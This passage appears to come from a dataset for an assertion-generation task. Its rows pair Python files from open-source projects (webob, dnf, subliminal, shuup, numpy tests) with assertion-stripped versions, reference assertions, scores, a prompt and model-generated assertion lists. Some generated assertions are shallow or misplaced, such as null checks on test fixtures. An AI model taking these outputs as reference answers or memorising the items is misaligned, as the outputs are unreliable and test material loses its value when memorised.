26        if hasattr(v, 'filename'):
27            r = Response(text_('%s\n%r' % (v.filename, v.value)))
28        else:
29            r = Response(v)
30        return r(env, sr)
31    text = b'\xea\xf3...'.decode('cp1251')
32    def test(post):
33        req = Request.blank('/?a', POST=post)
34        req.environ['CONTENT_TYPE'] = 'multipart/form-data; charset=windows-1251; boundary=BOUNDARY'
35        return req.get_response(tapp)
36
37    r = test(t1)
38    eq_(r.text, text)
39    r = test(t2)
40    eq_(r.text, 'file\n%r' % text.encode('cp1251'))
41    r = test(t3)
42    eq_(r.text, ""%s\n%r"" % (text, b'foo'))
43
44    #req = Request.blank('/?a', POST={'a': ('file', text.encode('cp1251'))},
45
46
47    # req = Request({}, charset='utf8')
48    # req = Request({})
49    # print req.charset
50    # print req._charset_cache
51    # print req.environ.get('CONTENT_TYPE')
52    #print '\xd0\xba\xd1\x83...'.decode('utf8').encode('cp1251')
53    #print u'\u043a'.encode('cp1251')
54
55def test_transcode_query():
56    req = Request.blank('/?%EF%F0%E8=%E2%E5%F2')
57    req2 = req.decode('cp1251')
58    eq_(req2.query_string, '%D0%BF%D1%80%D0%B8=%D0%B2%D0%B5%D1%82')
59
60def test_transcode_non_multipart():
61    req = Request.blank('/?a', POST='%EF%F0%E8=%E2%E5%F2')
62    req._content_type_raw = 'application/x-www-form-urlencoded'
63    req2 = req.decode('cp1251')
64    eq_(native_(req2.body), '%D0%BF%D1%80%D0%B8=%D0%B2%D0%B5%D1%82')
65
66def test_transcode_non_form():
67    req = Request.blank('/?a', POST='%EF%F0%E8=%E2%E5%F2')
68    req._content_type_raw = 'application/x-foo'
69    req2 = req.decode('cp1251')
70    eq_(native_(req2.body), '%EF%F0%E8=%E2%E5%F2')
71
72def test_transcode_noop():
73    req = Request.blank('/')
74
75def test_transcode_query():
76    t = Transcoder('ascii')
77    eq_(t.transcode_query('a'), 'a')
78",4384,"[[18, 'env', '!=', None, ""environment cannot be None""],
[18, 'sr', '!=', None, ""start_response cannot be None""],
[33, 'post', '!=', None, ""POST data cannot be None""],
[55, 'req', '!=', None, ""request cannot be None""],
[72, 'req', '!=', None, ""request cannot be None""],
[76, 't', '!=', None, ""Transcoder's input cannot be None""]]"
kudlav/dnf,"# goal.py
# Customized hawkey.Goal
#
# Copyright (C) 2014  Red Hat, Inc.
#
# This copyrighted material is made available to anyone wishing to use,
# modify, copy, or redistribute it subject to the terms and conditions of
# the GNU General Public License v.2, or (at your option) any later version.
# This program is distributed in the hope that it will be useful, but WITHOUT
# ANY WARRANTY expressed or implied, including the implied warranties of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU General
# Public License for more details.  You should have received a copy of the
# GNU General Public License along with this program; if not, write to the
# Free Software Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA
# 02110-1301, USA.  Any Red Hat trademarks that are incorporated in the
# source code or documentation are not subject to the GNU General Public
# License and may only be used or replicated with the express permission of
# Red Hat, Inc.
#

from __future__ import absolute_import
from __future__ import unicode_literals
from dnf.i18n import _
import logging
import hawkey

logger = logging.getLogger('dnf')

class Goal(hawkey.Goal):
    def __init__(self, sack):
        super(Goal, self).__init__(sack)
        self.group_members = set()

    def get_reason(self, pkg):
        code = super(Goal, self).get_reason(pkg)
        if code == hawkey.REASON_DEP:
            return 'dep'
        if code == hawkey.REASON_USER:
            if pkg.name in self.group_members:
                return 'group'
            return 'user'
        assert False, 'Unknown reason: %d' % code

    def group_reason(self, pkg, current_reason):
        if current_reason == 'unknown' and pkg.name in self.group_members:
            return 'group'
        return current_reason

    def push_userinstalled(self, query, yumdb):
        msg = _('--> Finding unneeded leftover dependencies')
        logger.debug(msg)
        for pkg in query.installed():
            yumdb_info = yumdb.get_package(pkg)
            reason = getattr(yumdb_info, 'reason', 'user')
            if reason != 'dep':
                self.userinstalled(pkg)
","
1# goal.py
2# Customized hawkey.Goal
3#
4# Copyright (C) 2014  Red Hat, Inc.
5#
6# This copyrighted material is made available to anyone wishing to use,
7# modify, copy, or redistribute it subject to the terms and conditions of
8# the GNU General Public License v.2, or (at your option) any later version.
9# This program is distributed in the hope that it will be useful, but WITHOUT
10# ANY WARRANTY expressed or implied, including the implied warranties of
11# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU General
12# Public License for more details.  You should have received a copy of the
13# GNU General Public License along with this program; if not, write to the
14# Free Software Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA
15# 02110-1301, USA.  Any Red Hat trademarks that are incorporated in the
16# source code or documentation are not subject to the GNU General Public
17# License and may only be used or replicated with the express permission of
18# Red Hat, Inc.
19#
20
21from __future__ import absolute_import
22from __future__ import unicode_literals
23from dnf.i18n import _
24import logging
25import hawkey
26
27logger = logging.getLogger('dnf')
28
29class Goal(hawkey.Goal):
30    def __init__(self, sack):
31        super(Goal, self).__init__(sack)
32        self.group_members = set()
33
34    def get_reason(self, pkg):
35        code = super(Goal, self).get_reason(pkg)
36        if code == hawkey.REASON_DEP:
37            return 'dep'
38        if code == hawkey.REASON_USER:
39            if pkg.name in self.group_members:
40                return 'group'
41            return 'user'
42
43    def group_reason(self, pkg, current_reason):
44        if current_reason == 'unknown' and pkg.name in self.group_members:
45            return 'group'
46        return current_reason
47
48    def push_userinstalled(self, query, yumdb):
49        msg = _('--> Finding unneeded leftover dependencies')
50        logger.debug(msg)
51        for pkg in query.installed():
52            yumdb_info = yumdb.get_package(pkg)
53            reason = getattr(yumdb_info, 'reason', 'user')
54            if reason != 'dep':
55                self.userinstalled(pkg)
56","[['False', '==', 'True']]",1,1,1.0,0.0004621072088724,"['logger', 'sack', 'self.group_members', 'pkg', 'code', 'current_reason', 'query', 'yumdb', 'msg', 'yumdb_info', 'reason']",11,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['logger', 'sack', 'self.group_members', 'pkg', 'code', 'current_reason', 'query', 'yumdb', 'msg', 'yumdb_info', 'reason']
*Code:

1# goal.py
2# Customized hawkey.Goal
3#
4# Copyright (C) 2014  Red Hat, Inc.
5#
6# This copyrighted material is made available to anyone wishing to use,
7# modify, copy, or redistribute it subject to the terms and conditions of
8# the GNU General Public License v.2, or (at your option) any later version.
9# This program is distributed in the hope that it will be useful, but WITHOUT
10# ANY WARRANTY expressed or implied, including the implied warranties of
11# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU General
12# Public License for more details.  You should have received a copy of the
13# GNU General Public License along with this program; if not, write to the
14# Free Software Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA
15# 02110-1301, USA.  Any Red Hat trademarks that are incorporated in the
16# source code or documentation are not subject to the GNU General Public
17# License and may only be used or replicated with the express permission of
18# Red Hat, Inc.
19#
20
21from __future__ import absolute_import
22from __future__ import unicode_literals
23from dnf.i18n import _
24import logging
25import hawkey
26
27logger = logging.getLogger('dnf')
28
29class Goal(hawkey.Goal):
30    def __init__(self, sack):
31        super(Goal, self).__init__(sack)
32        self.group_members = set()
33
34    def get_reason(self, pkg):
35        code = super(Goal, self).get_reason(pkg)
36        if code == hawkey.REASON_DEP:
37            return 'dep'
38        if code == hawkey.REASON_USER:
39            if pkg.name in self.group_members:
40                return 'group'
41            return 'user'
42
43    def group_reason(self, pkg, current_reason):
44        if current_reason == 'unknown' and pkg.name in self.group_members:
45            return 'group'
46        return current_reason
47
48    def push_userinstalled(self, query, yumdb):
49        msg = _('--> Finding unneeded leftover dependencies')
50        logger.debug(msg)
51        for pkg in query.installed():
52            yumdb_info = yumdb.get_package(pkg)
53            reason = getattr(yumdb_info, 'reason', 'user')
54            if reason != 'dep':
55                self.userinstalled(pkg)
56",3720,"[[30, 'sack', '!=', None, ""function parameter can't be None""],
 [34, 'pkg', '!=', None, ""function parameter can't be None""],
 [43, 'pkg', '!=', None, ""function parameter can't be None""],
 [43, 'current_reason', '!=', None, ""function parameter can't be None""],
 [48, 'query', '!=', None, ""function parameter can't be None""],
 [48, 'yumdb', '!=', None, ""function parameter can't be None""]]"
neo1691/subliminal,"# -*- coding: utf-8 -*-
from six import text_type as str

from subliminal.utils import hash_opensubtitles, hash_thesubdb, sanitize


def test_hash_opensubtitles(mkv):
    assert hash_opensubtitles(mkv['test1']) == '40b44a7096b71ec3'


def test_hash_opensubtitles_too_small(tmpdir):
    path = tmpdir.ensure('test_too_small.mkv')
    assert hash_opensubtitles(str(path)) is None


def test_hash_thesubdb(mkv):
    assert hash_thesubdb(mkv['test1']) == '054e667e93e254f8fa9f9e8e6d4e73ff'


def test_hash_thesubdb_too_small(tmpdir):
    path = tmpdir.ensure('test_too_small.mkv')
    assert hash_thesubdb(str(path)) is None


def test_sanitize():
    assert sanitize('Marvel\'s Agents of S.H.I.E.L.D.') == 'marvels agents of s h i e l d'
","
1# -*- coding: utf-8 -*-
2from six import text_type as str
3
4from subliminal.utils import hash_opensubtitles, hash_thesubdb, sanitize
5
6
7def test_hash_opensubtitles(mkv):
8
9
10def test_hash_opensubtitles_too_small(tmpdir):
11    path = tmpdir.ensure('test_too_small.mkv')
12
13
14def test_hash_thesubdb(mkv):
15
16
17def test_hash_thesubdb_too_small(tmpdir):
18    path = tmpdir.ensure('test_too_small.mkv')
19
20
21def test_sanitize():
22","[[""hash_opensubtitles(mkv['test1'])"", '==', ""'40b44a7096b71ec3'""], ['hash_opensubtitles(str(path))', '==', 'None'], [""hash_thesubdb(mkv['test1'])"", '==', ""'054e667e93e254f8fa9f9e8e6d4e73ff'""], ['hash_thesubdb(str(path))', '==', 'None'], [""sanitize('Marvel\\'s Agents of S.H.I.E.L.D.')"", '==', ""'marvels agents of s h i e l d'""]]",5,5,1.0,0.0068027210884353,"['mkv', 'tmpdir', 'path']",3,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['mkv', 'tmpdir', 'path']
*Code:

1# -*- coding: utf-8 -*-
2from six import text_type as str
3
4from subliminal.utils import hash_opensubtitles, hash_thesubdb, sanitize
5
6
7def test_hash_opensubtitles(mkv):
8
9
10def test_hash_opensubtitles_too_small(tmpdir):
11    path = tmpdir.ensure('test_too_small.mkv')
12
13
14def test_hash_thesubdb(mkv):
15
16
17def test_hash_thesubdb_too_small(tmpdir):
18    path = tmpdir.ensure('test_too_small.mkv')
19
20
21def test_sanitize():
22",1849,"[[7, 'mkv', '!=', None, ""hash_opensubtitles function requires a non-null input""],
[10, 'tmpdir', '!=', None, ""test_hash_opensubtitles_too_small function requires a non-null input""],
[14, 'mkv', '!=', None, ""test_hash_thesubdb function requires a non-null input""],
[17, 'tmpdir', '!=', None, ""test_hash_thesubdb_too_small function requires a non-null input""]]"
shawnadelic/shuup,"# -*- coding: utf-8 -*-
# This file is part of Shuup.
#
# Copyright (c) 2012-2016, Shoop Ltd. All rights reserved.
#
# This source code is licensed under the AGPLv3 license found in the
# LICENSE file in the root directory of this source tree.
from shuup.core.models import StockBehavior
from shuup.testing.factories import create_package_product


def get_unstocked_package_product_and_stocked_child(shop, supplier, child_logical_quantity=1):
    package_product = create_package_product(""Package-Product-Test"", shop=shop, supplier=supplier, children=1)
    assert package_product.stock_behavior == StockBehavior.UNSTOCKED

    quantity_map = package_product.get_package_child_to_quantity_map()
    assert len(quantity_map.keys()) == 1

    child_product = list(quantity_map.keys())[0]
    child_product.stock_behavior = StockBehavior.STOCKED
    child_product.save()

    assert quantity_map[child_product] == 1

    supplier.adjust_stock(child_product.id, child_logical_quantity)

    stock_status = supplier.get_stock_status(child_product.id)
    assert stock_status.logical_count == child_logical_quantity

    return package_product, child_product
","
1# -*- coding: utf-8 -*-
2# This file is part of Shuup.
3#
4# Copyright (c) 2012-2016, Shoop Ltd. All rights reserved.
5#
6# This source code is licensed under the AGPLv3 license found in the
7# LICENSE file in the root directory of this source tree.
8from shuup.core.models import StockBehavior
9from shuup.testing.factories import create_package_product
10
11
12def get_unstocked_package_product_and_stocked_child(shop, supplier, child_logical_quantity=1):
13    package_product = create_package_product(""Package-Product-Test"", shop=shop, supplier=supplier, children=1)
14
15    quantity_map = package_product.get_package_child_to_quantity_map()
16
17    child_product = list(quantity_map.keys())[0]
18    child_product.stock_behavior = StockBehavior.STOCKED
19    child_product.save()
20
21
22    supplier.adjust_stock(child_product.id, child_logical_quantity)
23
24    stock_status = supplier.get_stock_status(child_product.id)
25
26    return package_product, child_product
27","[['package_product.stock_behavior', '==', 'StockBehavior.UNSTOCKED'], ['len(quantity_map.keys())', '==', '1'], ['quantity_map[child_product]', '==', '1'], ['stock_status.logical_count', '==', 'child_logical_quantity']]",4,4,1.0,0.0034662045060658,"['shop', 'supplier', 'child_logical_quantity', 'package_product', 'quantity_map', 'child_product', 'child_product.stock_behavior', 'stock_status']",8,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['shop', 'supplier', 'child_logical_quantity', 'package_product', 'quantity_map', 'child_product', 'child_product.stock_behavior', 'stock_status']
*Code:

1# -*- coding: utf-8 -*-
2# This file is part of Shuup.
3#
4# Copyright (c) 2012-2016, Shoop Ltd. All rights reserved.
5#
6# This source code is licensed under the AGPLv3 license found in the
7# LICENSE file in the root directory of this source tree.
8from shuup.core.models import StockBehavior
9from shuup.testing.factories import create_package_product
10
11
12def get_unstocked_package_product_and_stocked_child(shop, supplier, child_logical_quantity=1):
13    package_product = create_package_product(""Package-Product-Test"", shop=shop, supplier=supplier, children=1)
14
15    quantity_map = package_product.get_package_child_to_quantity_map()
16
17    child_product = list(quantity_map.keys())[0]
18    child_product.stock_behavior = StockBehavior.STOCKED
19    child_product.save()
20
21
22    supplier.adjust_stock(child_product.id, child_logical_quantity)
23
24    stock_status = supplier.get_stock_status(child_product.id)
25
26    return package_product, child_product
27",2508,"[[12, 'shop', '!=', None, ""shop argument must be a valid object""],
[12, 'supplier', '!=', None, ""supplier argument must be a valid object""],
[12, 'child_logical_quantity', '>=', 1, ""child_logical_quantity argument must be at least 1""],
[14, 'package_product', '!=', None, ""package_product must be successfully created""],
[15, 'quantity_map', '!=', None, ""quantity_map must be successfully populated""],
[17, 'child_product', '!=', None, ""child_product list must not be empty""],
[18, 'child_product.stock_behavior', '==', 'StockBehavior.STOCKED', ""child_product's stock_behavior must be STOCKED""],
[24, 'stock_status', '!=', None, ""stock_status must be successfully retrieved""],
[26, 'package_product', '!=', None, ""function must return a package_product""],
[26, 'child_product', '!=', None, ""function must return a child_product""]]"
keyurpatel076/MissionPlannerGit,"import sys
import warnings

import numpy as np
from numpy.testing import *


warnings.filterwarnings('ignore',
             'Casting complex values to real discards the imaginary part')

types = [np.bool_, np.byte, np.ubyte, np.short, np.ushort, np.intc, np.uintc,
         np.int_, np.uint, np.longlong, np.ulonglong,
         np.single, np.double, np.longdouble, np.csingle,
         np.cdouble, np.clongdouble]

alltypes = list( types )
alltypes.append( np.datetime64 )
alltypes.append( np.timedelta64 )

class TestArrayTypes(TestCase):

    def test_argmax( self ):

        x = np.array( [False, False, True, False], dtype=np.bool )
        assert x.argmax() == 2, ""Broken array.argmax on np.bool""

        a = np.array( [u'aaa', u'aa', u'bbb'] )
        # u'aaa' > u'aa' and u'bbb' > u'aaa'  Hence, argmax == 2.
        assert a.argmax() == 2, ""Broken array.argmax on unicode data.""

        a = np.array( [ 'aaa', 'aa', 'bbb'] )
        # 'aaa' > 'aa' and 'bbb' > 'aaa'  Hence, argmax == 2.
        assert a.argmax() == 2, ""Broken array.argmax on string data.""

    def test_argmax_numeric( self ):

        # Skip the np.bool_ type as it lacks a fill function, hence can't use
        # arange().
        for k,t in enumerate( alltypes[1:] ):

            a = np.arange( 5, dtype=t )
            assert a.argmax() == 4, ""Broken array.argmax on type: "" + t

    def test_nonzero_numeric_types( self ):

        for k,t in enumerate(alltypes):

            a = np.array( [ t(1) ] )

            assert a, ""Broken array.nonzero on type: "" + t

    def test_nonzero_string_types( self ):

        a = np.array( [ 'aaa' ] )
        assert a, ""Broken array.nonzero on string elements.""

        a = np.array( [ u'aaa' ] )
        assert a, ""Broken array.nonzero on Unicode elements.""

    def test_compare( self ):
        # Light bulb!  argmax doesn't call compare() for numeric/logical
        # types.  It only does that for string types.  Duh.

        pass

    def test_copyswap( self ):

        # Skip np.bool_.
        for k,t in enumerate( types[1:] ):

            x = np.arange( 10, dtype=t )
            # This should exeercise <typoe>_copyswap
            x[::2].fill( t(2) )

            assert_equal( x, [2,1,2,3,2,5,2,7,2,9] )

    def test_copyswap_misc( self ):

        x = np.array( [ u'a', u'b', u'c' ] )
        x[::2].fill( u'd' )
        assert_equal( x, [u'd', u'b', u'd'] )

    def test_copyswapn( self ):

        # bool lacks arange support.
        for k,t in enumerate( alltypes[1:] ):

            x = np.arange( 10, dtype=t )
            y = x.byteswap()
            z = y.byteswap()

            assert_equal( z, x )

    def test_copyswapn_misc( self ):
        x = np.array( [ u'a', u'b', u'c' ] )
        y = x.byteswap()
        z = y.byteswap()

        assert_equal( z, x )

    def test_compare( self ):

        for k,t in enumerate( alltypes[1:] ):

            try:
                a = np.arange( 10, dtype=t )
                keys = a[::2]
                b = a.searchsorted( keys )
                c = a.copy()
                np.insert( c, b, b.astype( t ) )
                c.sort()
                assert_equal( c, a )

            except TypeError, e:
                print ""Trouble with type %d:"" % k, e

    def test_compare_bool( self ):
        # bool can't handle numpy.arange(), so has to be coded separately.
        a = np.array( [False, True], dtype=np.bool_ )
        keys = a
        b = a.searchsorted( keys )
        c = a.copy()
        np.insert( c, b, keys )
        c.sort()
        assert_equal( c, a )

    def test_dot( self ):

        # Do something to test dot on bool...

        for k,t in enumerate( alltypes[1:] ):
            a = np.arange( 3, dtype=t ) + 1
            assert a.dot(a) == t(14), \
                   ""Problem with dot product with array of type %s"" % k

    def test_clip( self ):

        for k,t in enumerate( alltypes[1:] ):
            a = np.arange( 5, dtype=t )
            b = a.clip( 2, 3 )
            x = np.array( [2,2,2,3,3], dtype=t )
            assert_equal( b, x )

    def test_clip_bool( self ):
        a = np.array( [False, True], np.bool )
        assert_equal( a.clip(False,False), [False, False] )

    def test_array_casting( self ):

        for k,t in enumerate( alltypes ):

            a = np.array( [ t(1) ] )

            for k2, t2 in enumerate( alltypes ):

                b = a.astype( t2 )

                if k2 < len(types):
                    assert b[0] == 1, \
                           ""Busted array type casting: k=%d k2=%d"" % (k,k2)

                else:
                    # Casting to datetime64 yields a 1/1/1970+... result,
                    # which isn't so hot for checking against ""1"".  So, in
                    # these cases, just cast back to the starting time, and
                    # make sure we got back what we started with.
                    c = b.astype( t )
                    assert_equal( c, a )

    def test_take( self ):
        # Test all types, but skipp np.bool_ for now, as it lacks a fill
        # function.  Grrr.
        for k,t in enumerate( alltypes[1:] ):
            a = np.arange( 10, dtype=t )
            idx = np.arange(5) * 2
            c = np.take( a, idx )
            assert_equal( c, a[::2] )

    def test_putmask( self ):

        for k,t in enumerate( alltypes[1:] ):
            a = np.arange( 5, dtype=t )
            mask = np.zeros( 5, dtype=np.bool )
            mask[::2] = True
            np.putmask( a, mask, t(8) )

            x = np.array( [8,1,8,3,8], dtype=t )

            assert_equal( a, x )

    def test_fillwithscalar( self ):

        a = np.empty( 2, dtype=np.datetime64 )
        a.fill( np.datetime64( 3 ) )
        x = np.zeros( 2, dtype=np.datetime64 ) + 3
        assert_equal( a, x )

if __name__ == ""__main__"":
    run_module_suite()
","
1import sys
2import warnings
3
4import numpy as np
5from numpy.testing import *
6
7
8warnings.filterwarnings('ignore',
9             'Casting complex values to real discards the imaginary part')
10
11types = [np.bool_, np.byte, np.ubyte, np.short, np.ushort, np.intc, np.uintc,
12         np.int_, np.uint, np.longlong, np.ulonglong,
13         np.single, np.double, np.longdouble, np.csingle,
14         np.cdouble, np.clongdouble]
15
16alltypes = list( types )
17alltypes.append( np.datetime64 )
18alltypes.append( np.timedelta64 )
19
20class TestArrayTypes(TestCase):
21
22    def test_argmax( self ):
23
24        x = np.array( [False, False, True, False], dtype=np.bool )
25
26        a = np.array( [u'aaa', u'aa', u'bbb'] )
27        # u'aaa' > u'aa' and u'bbb' > u'aaa'  Hence, argmax == 2.
28
29        a = np.array( [ 'aaa', 'aa', 'bbb'] )
30        # 'aaa' > 'aa' and 'bbb' > 'aaa'  Hence, argmax == 2.
31
32    def test_argmax_numeric( self ):
33
34        # Skip the np.bool_ type as it lacks a fill function, hence can't use
35        # arange().
36        for k,t in enumerate( alltypes[1:] ):
37
38            a = np.arange( 5, dtype=t )
39
40    def test_nonzero_numeric_types( self ):
41
42        for k,t in enumerate(alltypes):
43
44            a = np.array( [ t(1) ] )
45
46
47    def test_nonzero_string_types( self ):
48
49        a = np.array( [ 'aaa' ] )
50
51        a = np.array( [ u'aaa' ] )
52
53    def test_compare( self ):
54        # Light bulb!  argmax doesn't call compare() for numeric/logical
55        # types.  It only does that for string types.  Duh.
56
57        pass
58
59    def test_copyswap( self ):
60
61        # Skip np.bool_.
62        for k,t in enumerate( types[1:] ):
63
64            x = np.arange( 10, dtype=t )
65            # This should exeercise <typoe>_copyswap
66            x[::2].fill( t(2) )
67
68
69    def test_copyswap_misc( self ):
70
71        x = np.array( [ u'a', u'b', u'c' ] )
72        x[::2].fill( u'd' )
73
74    def test_copyswapn( self ):
75
76        # bool lacks arange support.
77        for k,t in enumerate( alltypes[1:] ):
78
79            x = np.arange( 10, dtype=t )
80            y = x.byteswap()
81            z = y.byteswap()
82
83
84    def test_copyswapn_misc( self ):
85        x = np.array( [ u'a', u'b', u'c' ] )
86        y = x.byteswap()
87        z = y.byteswap()
88
89
90    def test_compare( self ):
91
92        for k,t in enumerate( alltypes[1:] ):
93
94            try:
95                a = np.arange( 10, dtype=t )
96                keys = a[::2]
97                b = a.searchsorted( keys )
98                c = a.copy()
99                np.insert( c, b, b.astype( t ) )
100                c.sort()
101
102            except TypeError, e:
103                print ""Trouble with type %d:"" % k, e
104
105    def test_compare_bool( self ):
106        # bool can't handle numpy.arange(), so has to be coded separately.
107        a = np.array( [False, True], dtype=np.bool_ )
108        keys = a
109        b = a.searchsorted( keys )
110        c = a.copy()
111        np.insert( c, b, keys )
112        c.sort()
113
114    def test_dot( self ):
115
116        # Do something to test dot on bool...
117
118        for k,t in enumerate( alltypes[1:] ):
119            a = np.arange( 3, dtype=t ) + 1
120                   ""Problem with dot product with array of type %s"" % k
121
122    def test_clip( self ):
123
124        for k,t in enumerate( alltypes[1:] ):
125            a = np.arange( 5, dtype=t )
126            b = a.clip( 2, 3 )
127            x = np.array( [2,2,2,3,3], dtype=t )
128
129    def test_clip_bool( self ):
130        a = np.array( [False, True], np.bool )
131
132    def test_array_casting( self ):
133
134        for k,t in enumerate( alltypes ):
135
136            a = np.array( [ t(1) ] )
137
138            for k2, t2 in enumerate( alltypes ):
139
140                b = a.astype( t2 )
141
142                if k2 < len(types):
143                           ""Busted array type casting: k=%d k2=%d"" % (k,k2)
144
145                else:
146                    # Casting to datetime64 yields a 1/1/1970+... result,
147                    # which isn't so hot for checking against ""1"".  So, in
148                    # these cases, just cast back to the starting time, and
149                    # make sure we got back what we started with.
150                    c = b.astype( t )
151
152    def test_take( self ):
153        # Test all types, but skipp np.bool_ for now, as it lacks a fill
154        # function.  Grrr.
155        for k,t in enumerate( alltypes[1:] ):
156            a = np.arange( 10, dtype=t )
157            idx = np.arange(5) * 2
158            c = np.take( a, idx )
159
160    def test_putmask( self ):
161
162        for k,t in enumerate( alltypes[1:] ):
163            a = np.arange( 5, dtype=t )
164            mask = np.zeros( 5, dtype=np.bool )
165            mask[::2] = True
166            np.putmask( a, mask, t(8) )
167
168            x = np.array( [8,1,8,3,8], dtype=t )
169
170
171    def test_fillwithscalar( self ):
172
173        a = np.empty( 2, dtype=np.datetime64 )
174        a.fill( np.datetime64( 3 ) )
175        x = np.zeros( 2, dtype=np.datetime64 ) + 3
176
177if __name__ == ""__main__"":
178    run_module_suite()
179","[['x.argmax()', '==', '2'], ['a.argmax()', '==', '2'], ['a.argmax()', '==', '2'], ['a.argmax()', '==', '4'], ['a', '==', 'True'], ['a', '==', 'True'], ['a', '==', 'True'], ['a.dot(a)', '==', 't(14)'], ['b[0]', '==', '1']]",21,9,0.4285714285714285,0.0015347885402455,"['types', 'alltypes', 'x', 'a', 'y', 'z', 'keys', 'b', 'c', 'idx', 'mask', 'mask[::2]']",12,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['types', 'alltypes', 'x', 'a', 'y', 'z', 'keys', 'b', 'c', 'idx', 'mask', 'mask[::2]']
*Code:

1import sys
2import warnings
3
4import numpy as np
5from numpy.testing import *
6
7
8warnings.filterwarnings('ignore',
9             'Casting complex values to real discards the imaginary part')
10
11types = [np.bool_, np.byte, np.ubyte, np.short, np.ushort, np.intc, np.uintc,
12         np.int_, np.uint, np.longlong, np.ulonglong,
13         np.single, np.double, np.longdouble, np.csingle,
14         np.cdouble, np.clongdouble]
15
16alltypes = list( types )
17alltypes.append( np.datetime64 )
18alltypes.append( np.timedelta64 )
19
20class TestArrayTypes(TestCase):
21
22    def test_argmax( self ):
23
24        x = np.array( [False, False, True, False], dtype=np.bool )
25
26        a = np.array( [u'aaa', u'aa', u'bbb'] )
27        # u'aaa' > u'aa' and u'bbb' > u'aaa'  Hence, argmax == 2.
28
29        a = np.array( [ 'aaa', 'aa', 'bbb'] )
30        # 'aaa' > 'aa' and 'bbb' > 'aaa'  Hence, argmax == 2.
31
32    def test_argmax_numeric( self ):
33
34        # Skip the np.bool_ type as it lacks a fill function, hence can't use
35        # arange().
36        for k,t in enumerate( alltypes[1:] ):
37
38            a = np.arange( 5, dtype=t )
39
40    def test_nonzero_numeric_types( self ):
41
42        for k,t in enumerate(alltypes):
43
44            a = np.array( [ t(1) ] )
45
46
47    def test_nonzero_string_types( self ):
48
49        a = np.array( [ 'aaa' ] )
50
51        a = np.array( [ u'aaa' ] )
52
53    def test_compare( self ):
54        # Light bulb!  argmax doesn't call compare() for numeric/logical
55        # types.  It only does that for string types.  Duh.
56
57        pass
58
59    def test_copyswap( self ):
60
61        # Skip np.bool_.
62        for k,t in enumerate( types[1:] ):
63
64            x = np.arange( 10, dtype=t )
